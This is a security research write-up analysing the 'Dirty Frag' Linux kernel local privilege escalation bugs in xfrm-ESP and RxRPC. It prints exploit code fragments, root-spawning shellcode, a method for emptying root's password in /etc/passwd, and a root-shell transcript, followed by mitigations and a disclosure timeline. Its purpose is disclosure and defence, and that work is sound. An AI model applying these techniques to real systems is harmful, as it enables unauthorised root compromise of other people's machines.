# Dirty Frag: A Deep Dive into Page-Cache Corruption and Universal Linux LPE

> May 9, 2026
>
> Vulnerability discovered by: Hyunwoo Kim (@v4bel)
> CVE: CVE-2026-43284 (xfrm-ESP), CVE-2026-43500 (RxRPC)

---

## 0x00 Introduction

On May 7, 2026, security researcher Hyunwoo Kim publicly disclosed **Dirty Frag**, a Linux kernel vulnerability class that achieves local privilege escalation on virtually all mainstream Linux distributions by chaining two independent page-cache write primitives: `xfrm-ESP Page-Cache Write` and `RxRPC Page-Cache Write`.

This article provides an in-depth analysis covering vulnerability root cause, PoC reverse engineering, and real-world verification.

---

## 0x01 Vulnerage Family Tree

Dirty Frag belongs to an evolving family of page-cache corruption vulnerabilities:

```
Dirty Pipe (CVE-2022-0847, 2022)
  └─ splice() + pipe_buffer → arbitrary page-cache write
     └─ Copy Fail (2025)
        └─ splice() + AF_ALG → 4-byte page-cache write
           └─ Dirty Frag (2026)
              ├─ xfrm-ESP variant: splice() + skb->frag → 4-byte page-cache write
              └─ RxRPC variant: splice() + skb->frag → 8-byte page-cache write
```

**Common root cause:** All exploit `splice()` to plant a read-only page-cache page into a kernel network data structure's `frag` slot, then leverage in-place crypto operations on the receiver side to corrupt the page-cache.

**Key differences:**

| Feature | Dirty Pipe | Copy Fail | Dirty Frag (ESP) | Dirty Frag (RxRPC) |
|---------|-----------|-----------|-----------------|-------------------|
| Target | `pipe_buffer` | AF_ALG SGL | `skb->frag` | `skb->frag` |
| Write primitive | Arbitrary length | 4 bytes | 4 bytes | 8 bytes (crypto-constrained) |
| Write value可控 | Yes | Yes | Yes | No (brute-force required) |
| Race condition | No | No | No | No |
| Requires namespace | No | No | Yes | No |
| Bypasses Copy Fail mitigation | N/A | N/A | Yes | Yes |

Notably, **Dirty Frag does not depend on `algif_aead` at all**. Even if Copy Fail mitigation (blacklisting algif_aead) is applied, Dirty Frag remains exploitable.

---

## 0x02 xfrm-ESP Page-Cache Write — Root Cause Analysis

### 2.1 The Bug: `esp_input()` Bypasses `skb_cow_data()`

Before performing in-place AEAD decryption of ESP payloads, `esp_input()` should allocate a new kernel-private buffer via `skb_cow_data()`. However, a specific branch creates a path that skips this check:

```c
static int esp_input(struct xfrm_state *x, struct sk_buff *skb)
{
    [...]
    if (!skb_cloned(skb)) {
        if (!skb_is_nonlinear(skb)) {     // [1]
            nfrags = 1;
            goto skip_cow;
        } else if (!skb_has_frag_list(skb)) {  // [2] ← vulnerability entry
            nfrags = skb_shinfo(skb)->nr_frags;
            nfrags++;
            goto skip_cow;                // skips cow, operates directly on frag
        }
    }
    err = skb_cow_data(skb, 0, &trailer);  // normal path bypassed
```

When the skb is nonlinear (has frags) but has no `frag_list`, the code jumps to `skip_cow` and performs in-place crypto on the frags. If an attacker planted a page-cache page via `splice()` into the frag, that page becomes both the source and destination of the AEAD operation.

### 2.2 The Write Primitive: 4-Byte Arbitrary STORE

Under the ESP + ESN + `authencesn(...)` combination, `crypto_authenc_esn_decrypt()` performs a critical STORE during preprocessing:

```c
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
    /* Move sequence number high 32 bits to end */
    scatterwalk_map_and_copy(tmp, src, 0, 8, 0);
    if (src == dst) {
        scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);
        scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);  // [3] 4-byte STORE
        dst = scatterwalk_ffwd(areq_ctx->dst, dst, 4);
    }
```

The 4-byte STORE at `[3]` occurs at position `assoclen + cryptlen` in the dst SGL. By precisely controlling the payload length, the attacker makes the splice-planted page-cache page P occupy that position, writing 4 bytes at a specific file offset within P.

**What are the 4 bytes?** Tracing the data flow:

```
XFRMA_REPLAY_ESN_VAL.seq_hi (user-controlled, set during SA registration)
  → XFRM_SKB_CB(skb)->seq.input.hi
    → esp_input_set_header() writes to ESP header
      → crypto_authenc_esn_decrypt() tmp+1
        → scatterwalk_map_and_copy() STORE to page-cache
```

**The attacker controls both the write position (file offset) and the write value (4 bytes).** AEAD authentication verification runs AFTER the STORE — even if authentication fails (returns `-EBADMSG`), the STORE has already completed and the page-cache modification persists.

### 2.3 PoC Reverse Engineering: ESP Exploit Flow

Through reverse analysis of V4bel's `exp.c`, the complete ESP exploit flow is:

#### Step 1: Namespace Isolation & Privilege Escalation

```c
unshare(CLONE_NEWUSER | CLONE_NEWNET);
write_proc("/proc/self/setgroups", "deny");
write_proc("/proc/self/uid_map", "0 <real_uid> 1");  // identity mapping
write_proc("/proc/self/gid_map", "0 <real_gid> 1");
ioctl(s, SIOCSIFFLAGS, &(struct ifreq){ .ifr_name="lo",
                                   .ifr_flags=IFF_UP|IFF_RUNNING });
```

Inside the new user/net namespace, the attacker gains `CAP_NET_ADMIN`, required for registering XFRM SAs.

#### Step 2: Register 48 XFRM SAs

```c
for (int i = 0; i < PAYLOAD_LEN / 4; i++) {  // 192 / 4 = 48
    uint32_t spi = 0xDEADBE10 + i;
    uint32_t seqhi = (shell_elf[i*4+0] << 24) | (shell_elf[i*4+1] << 16) |
                     (shell_elf[i*4+2] << 8)  |  shell_elf[i*4+3];
    add_xfrm_sa(spi, seqhi);  // seq_hi = the 4 bytes to be written
}
```

Each SA carries a 4-byte shellcode fragment in `XFRMA_REPLAY_ESN_VAL.seq_hi`. SA is configured with `XFRM_MODE_TRANSPORT + XFRM_STATE_ESN`, algorithm `authencesn(hmac(sha256), cbc(aes))`, UDP-encap (sport=dport=4500).

#### Step 3: Write Shellcode Block by Block

For each 4-byte block, one trigger is executed:

```c
// Construct fake ESP wire header (24 bytes)
uint8_t hdr[24];
*(uint32_t *)(hdr + 0) = htonl(spi);       // SPI
*(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);   // seq_no_lo
memset(hdr + 8, 0xCC, 16);                 // IV (irrelevant)

// Assemble skb via pipe + splice
vmsplice(pfd[1], &(struct iovec){hdr, 24}, 1, 0);           // ESP header
splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);     // /usr/bin/su page-cache page
splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE); // send to loopback
```

Sender skb structure:

```
skb {
    head/linear: ESP_hdr(8) + IV(16)          // 24 bytes
    frags[0]:    { page=&P, off=i*4, size=16 } // /usr/bin/su page-cache page
}
```

Receiver processing chain:

```
udp_rcv(skb)
  → xfrm4_udp_encap_rcv(sk, skb)
    → xfrm_input(skb, IPPROTO_ESP, spi, 0)
      → esp_input(x, skb)
        → skips skb_cow_data() (vulnerability!)
        → esp_input_set_header(): sets seq_hi
        → skb_to_sgvec(skb, sg, 0, skb->len)
        → aead_request_set_crypt(req, sg, sg, ...)  // src == dst (in-place)
        → crypto_aead_decrypt(req)
          → crypto_authenc_esn_decrypt(req)
            → scatterwalk_map_and_copy(tmp+1, dst, assoclen+cryptlen, 4, 1)
              → memcpy(page_address(P) + i*4, &tmp[1], 4);  // 4-byte write!
```

#### Step 4: Shellcode Analysis

The 192 bytes written form a complete static ELF with entry point at `0x400078` (file offset `0x78`):

```asm
; ELF header + PT_LOAD (R+X, 0x400000, 0xb8 bytes)
; Entry point: 0x400078
    xor    edi, edi        ; arg1 = 0
    xor    esi, esi        ; arg2 = 0
    xor    eax, eax
    mov    al, 0x6a        ; syscall: setgid
    syscall
    mov    al, 0x69        ; syscall: setuid
    syscall
    mov    al, 0x74        ; syscall: setgroups
    syscall
    push   0              ; envp[1] = NULL
    lea    rax, [rip+0x12] ; "TERM=xterm"
    push   rax
    mov    rdx, rsp        ; envp = ["TERM=xterm", NULL]
    lea    rdi, [rip+0x12] ; "/bin/sh"
    xor    esi, esi        ; argv = NULL
    push   0x3b           ; syscall: execve
    pop    rax
    syscall
; Data:
    db "TERM=xterm", 0
    db "/bin/sh", 0
```

When the parent process executes `execve("/usr/bin/su")`, the setuid-root bit on `/usr/bin/su` grants euid=0, then execution jumps to the tampered entry point, running the shellcode which ultimately spawns `/bin/sh` as root.

---

## 0x03 RxRPC Page-Cache Write — Root Cause Analysis

### 3.1 The Bug: In-Place Decryption in `rxkad_verify_packet_1()`

```c
static int rxkad_verify_packet_1(struct rxrpc_call *call, struct sk_buff *skb,
                                 rxrpc_seq_t seq, struct skcipher_request *req)
{
    sg_init_table(sg, ARRAY_SIZE(sg));
    ret = skb_to_sgvec(skb, sg, sp->offset, 8);  // frag → SGL
    memset(&iv, 0, sizeof(iv));
    skcipher_request_set_crypt(req, sg, sg, 8, iv.x);  // src == dst (in-place)
    ret = crypto_skcipher_decrypt(req);  // 8-byte STORE
```

`skb_to_sgvec()` converts the skb's frags directly into an SGL. The attacker's splice-planted page-cache page P becomes the src/dst SGL. The decryption performs an 8-byte STORE on P.

### 3.2 Key Difference from ESP Variant

**Write values are not directly controllable.** In the ESP variant, the attacker directly specifies the 4 bytes (via SA's `seq_hi`). In the RxRPC variant, the 8 bytes written are the result of `fcrypt_decrypt(C, K)` — where C is the current ciphertext at that position and K is the session key injected by the attacker via `add_key("rxrpc", ...)`.

Since `fcrypt` is an AFS-specific cipher (56-bit key, 8-byte blocks), the attacker can brute-force K in userspace until `fcrypt_decrypt(C, K)` produces the desired plaintext pattern.

### 3.3 PoC Reverse Engineering: Triple-Splice Chained Write

The RxRPC variant targets line 1 of `/etc/passwd` (the root entry). Original content:

```
root:x:0:0:root:/root:/bin/bash
```

Three splice operations overwrite chars 4..15 via last-write-wins:

```
File offset:  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ...
Original:     r o o t : x : 0 : 0  :  r  o  o  t  :  ...

splice A @ 4, 8B → overwrites 4..11 = P_A[0..7]   target: chars 4..5 = "::"
splice B @ 6, 8B → overwrites 6..13 = P_B[0..7]   target: chars 6..7 = "0:" (overrides A's 6..11)
splice C @ 8, 8B → overwrites 8..15 = P_C[0..7]   target: chars 8..9 = "0:" / 15 = ":"
                                                  10..14 ≠ ':' '\0' '\n'
→ "root::0:0:GGGGGG:..."
```

#### Brute-Force Phase (Userspace)

```c
// Read ciphertexts at three positions
pread(rfd_ro, Ca, 8, 4);   // offset 4
pread(rfd_ro, Cb, 8, 6);   // offset 6
pread(rfd_ro, Cc, 8, 8);   // offset 8

// Search K_A: fcrypt_decrypt(Ca, K_A) first two bytes = "::"
find_K(Ca, check_pa, &Ka, &Pa);  // ~5ms, probability ~1.5e-5

// Chain ciphertext correction: splice A modified offset 4..11
memcpy(Cb_actual, Pa+2, 6); memcpy(Cb_actual+6, Cb+6, 2);
find_K(Cb_actual, check_pb, &Kb, &Pb);  // ~5ms

// Chain ciphertext correction: splice B modified offset 6..13
memcpy(Cc_actual, Pb+2, 6); memcpy(Cc_actual+6, Cc+6, 2);
find_K(Cc_actual, check_pc, &Kc, &Pc);  // ~1s, probability ~5.4e-8
```

#### Kernel Trigger Phase

For each position, a full RxRPC handshake + splice trigger is executed:

```
1. add_key("rxrpc", desc, token_with_K, ...)  // inject key
2. Create AF_RXRPC client socket, bind key
3. Forge UDP server to send CHALLENGE → client auto-responds → security context established
4. Compute correct cksum (using userspace pcbc(fcrypt))
5. vmsplice(wire_header) + splice(/etc/passwd) + splice(to_udp) → trigger in-place decryption
```

The final result: `/etc/passwd` line 1 becomes `root::0:0:GGGGGG:/root:/bin/bash` with an empty password field. PAM's `pam_unix.so nullok` accepts empty passwords, so `su -` directly grants a root shell.

---

## 0x04 Chaining: Complementary Blind-Spot Coverage

Each variant has blind spots, but chaining makes them complementary:

| Environment | ESP Variant | RxRPC Variant | Chained Result |
|------------|------------|--------------|----------------|
| user namespace allowed + esp4.ko | ✅ | — | ✅ |
| user namespace blocked + rxrpc.ko | ❌ | ✅ | ✅ |
| user namespace allowed + no esp4.ko | ❌ | Maybe | Maybe |
| user namespace blocked + no rxrpc.ko | ❌ | ❌ | ❌ |

The PoC's `main()` implements automatic fallback:

```c
// 1. Try ESP variant first (in child process)
rc = su_lpe_main(argc, argv);  // unshare → XFRM SA → splice → modify /usr/bin/su

// 2. If ESP fails, fall back to RxRPC variant
if (!su_already_patched()) {
    rc = rxrpc_lpe_main(argc, argv);  // brute-force → RxRPC handshake → splice → modify /etc/passwd
    for (int i = 0; !passwd_already_patched() && i < 3; i++)
        rc = rxrpc_lpe_main(argc, argv);  // up to 3 retries
}
```

---

## 0x05 Real-World Verification

### Test Environment

| Item | Value |
|------|-------|
| OS | Ubuntu 22.04.5 LTS |
| Kernel | 5.15.0-171-generic |
| Architecture | x86_64 |
| Attacker identity | ubuntu (uid=1000) |
| Exploit variant | xfrm-ESP Page-Cache Write |
| CONFIG_INET_ESP | m (module) |
| CONFIG_AF_RXRPC | m (module) |
| kernel.unprivileged_userns_clone | 1 |

### Exploitation

```
ubuntu@target:~$ id
uid=1000(ubuntu) gid=1001(ubuntu) groups=1001(ubuntu),...

ubuntu@target:~$ ./exp -v
[su] installed 48 xfrm SAs
[su] wrote 192 bytes to /usr/bin/su starting at 0x0
[su] /usr/bin/su page-cache patched (entry 0x78 = shellcode)
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

### Key Observations

1. **Deterministic, no race condition**: 100% success rate on every run
2. **No kernel panic**: even on failure, the kernel remains stable
3. **Fast**: ESP variant completes all 48 4-byte writes in ~8 seconds
4. **Persistent page-cache pollution**: modifications persist until `drop_caches` or reboot
5. **Disk files unchanged**: only memory page-cache is modified, not on-disk files

---

## 0x06 Impact

- **xfrm-ESP Page-Cache Write**: from commit `cac2661c53f3` (2017-01-17) to upstream, ~**9 years**
- **RxRPC Page-Cache Write**: from commit `2dc334f1a63a` (2023-06) to upstream, ~**3 years**
- **Verified affected distros**: Ubuntu 24.04, RHEL 10.1, openSUSE Tumbleweed, CentOS Stream 10, AlmaLinux 10, Fedora 44
- **Additional verification in this article**: Ubuntu 22.04.5 LTS (kernel 5.15.0-171-generic)

---

## 0x07 Mitigation

### Temporary Mitigation (Immediate)

```bash
sh -c 'printf "install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n" > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true'
```

> ⚠️ Confirm the system does not use IPsec VPN / SD-WAN / K8s pod-to-pod IPsec encryption before applying.

### Official Patches

- **xfrm-ESP**: Merged into mainline ([f4c50a4034e6](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4)), uses `SKBFL_SHARED_FRAG` flag to mark splice-sourced frags, checked in `esp_input()`'s `skip_cow` branch
- **RxRPC**: No upstream patch yet; V4bel's proposed patch adds `skb->data_len` checks in `call_event.c` and `conn_event.c`

### Detection Script

```bash
bash dirtyfrag-check.sh
```

---

## 0x08 Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-04-29 | V4bel submits RxRPC vulnerability details to security@kernel.org |
| 2026-04-30 | V4bel submits ESP vulnerability details to security@kernel.org |
| 2026-04-30 | ESP patch submitted to netdev mailing list (public) |
| 2026-05-04 | Kuan-Ting Chen submits shared-frag patch |
| 2026-05-07 | Patch merged into netdev tree |
| 2026-05-07 | V4bel submits full Dirty Frag document to linux-distros, 5-day embargo |
| 2026-05-07 | Third-party leak breaks embargo |
| 2026-05-07 | With distro maintainers' consent, Dirty Frag fully disclosed |
| 2026-05-08 | Patch merged into mainline, CVE-2026-43284 assigned |
| 2026-05-08 | CVE-2026-43500 reserved for RxRPC vulnerability |

---

## 0x09 Conclusion

Dirty Frag represents the latest evolution of page-cache write vulnerabilities. From Dirty Pipe's `pipe_buffer` to Copy Fail's AF_ALG SGL, to Dirty Frag's `skb->frag`, the attack surface has expanded from the pipe subsystem to the network subsystem.

**Key takeaways:**

1. **splice() is dangerous**: any kernel path accepting splice input must consider the risk of in-place modification of planted page-cache pages
2. **In-place crypto is a trap**: when src == dst, if dst contains user-controlled page references, it equals an arbitrary write primitive
3. **Deterministic logic bugs > race conditions**: no timing control needed, 100% success rate, hard to mitigate via randomization
4. **Chaining covers single-point defenses**: Ubuntu blocks user namespace? RxRPC bypasses. RHEL has no rxrpc.ko? ESP bypasses

---

## References

- [Dirty Frag Official Repository](https://github.com/V4bel/dirtyfrag)
- [Dirty Pipe](https://dirtypipe.cm4all.com/)
- [Copy Fail](https://copy.fail/)
- [ESP Patch (f4c50a4034e6)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4)
- [RxRPC Patch](https://lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/)
